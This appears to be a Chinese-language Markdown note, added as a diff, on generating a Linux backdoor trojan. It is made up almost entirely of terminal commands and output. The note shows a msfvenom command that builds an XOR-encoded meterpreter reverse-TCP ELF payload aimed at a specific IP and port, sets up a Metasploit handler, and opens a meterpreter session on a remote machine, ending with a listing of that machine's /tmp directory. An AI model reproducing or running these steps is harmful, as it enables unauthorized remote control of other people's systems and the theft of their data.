@@ -1,0 +1,124 @@
+## Linux后门木马生成
+1、使用msfvenom生成linux可执行文件
+
+
+┌──(root💀kali2020)-[~]
+└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=108.88.3.166 LPORT=4444 -b "\x00"  -i 10 -f elf -o /tmp/tank
+Found 4 compatible encoders
+Attempting to encode payload with 10 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=55, char=0x00)
+Attempting to encode payload with 10 iterations of x64/xor
+x64/xor succeeded with size 175 (iteration=0)
+x64/xor succeeded with size 215 (iteration=1)
+x64/xor succeeded with size 255 (iteration=2)
+x64/xor succeeded with size 295 (iteration=3)
+x64/xor succeeded with size 335 (iteration=4)
+x64/xor succeeded with size 375 (iteration=5)
+x64/xor succeeded with size 415 (iteration=6)
+x64/xor succeeded with size 455 (iteration=7)
+x64/xor succeeded with size 495 (iteration=8)
+x64/xor succeeded with size 535 (iteration=9)
+x64/xor chosen with final size 535
+Payload size: 535 bytes
+Final size of elf file: 655 bytes
+Saved as: /tmp/tank
+
+┌──(root💀kali2020)-[~]
+└─#
+
+
+
+### 开启监听
+
+
+Metasploit tip: Writing a custom module? After editing your module, why not try                                                                                                              the reload command
+
+[*] Starting persistent handler(s)...
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be spe                                                                                                             cified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+msf6 exploit(multi/handler) > set LHOST 108.88.3.166
+LHOST => 108.88.3.166
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  108.88.3.166     yes       The listen address (an interface may be spe                                                                                                             cified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 108.88.3.166:4444
+
+
+[*] Sending stage (3008420 bytes) to 108.88.3.246
+[*] Meterpreter session 1 opened (108.88.3.166:4444 -> 108.88.3.246:34516) at 20                                                                                                             21-02-26 02:06:04 -0500
+
+meterpreter >
+meterpreter >
+meterpreter > ls
+Listing: /tmp
+=============
+
+Mode              Size       Type  Last modified              Name
+----              ----       ----  -------------              ----
+41777/rwxrwxrwx   4096       dir   2021-01-26 19:26:53 -0500  .ICE-unix
+140777/rwxrwxrwx  0          soc   2020-07-17 23:25:34 -0400  .java_pid27024
+140777/rwxrwxrwx  0          soc   2020-07-17 23:25:34 -0400  .java_pid3040
+140777/rwxrwxrwx  0          soc   2020-07-17 23:25:34 -0400  .java_pid3478
+100644/rw-r--r--  823        fil   2020-09-14 02:02:22 -0400  LICENSE
+40755/rwxr-xr-x   4096       dir   2020-12-22 22:12:50 -0500  META-INF
+100644/rw-r--r--  2295       fil   2020-09-14 02:02:33 -0400  THANKS
+100644/rw-r--r--  9155       fil   2020-11-02 20:52:19 -0500  glaf-web-v3.4.rar
+40755/rwxr-xr-x   4096       dir   2021-02-26 01:10:49 -0500  hsperfdata_root
+40755/rwxr-xr-x   4096       dir   2021-02-04 02:02:41 -0500  hsperfdata_tank
+100644/rw-r--r--  285638     fil   2021-02-03 05:03:05 -0500  jtds-1.2.jar
+100644/rw-r--r--  117688     fil   2020-09-24 04:26:27 -0400  kk.log
+100644/rw-r--r--  129298843  fil   2020-12-23 21:47:25 -0500  nscms-bak.tar.gz
+40755/rwxr-xr-x   4096       dir   2020-12-22 22:12:50 -0500  org
+100755/rwxr-xr-x  536366     fil   2020-12-22 22:12:41 -0500  shiro-all.jar
+100755/rwxr-xr-x  655        fil   2021-02-26 01:44:41 -0500  tank
+100600/rw-------  82772      fil   2020-08-11 03:05:27 -0400  yum_save_tx-2020-0                                                                                                             8-11-15-05t4mpPE.yumtx
+
+meterpreter >
+
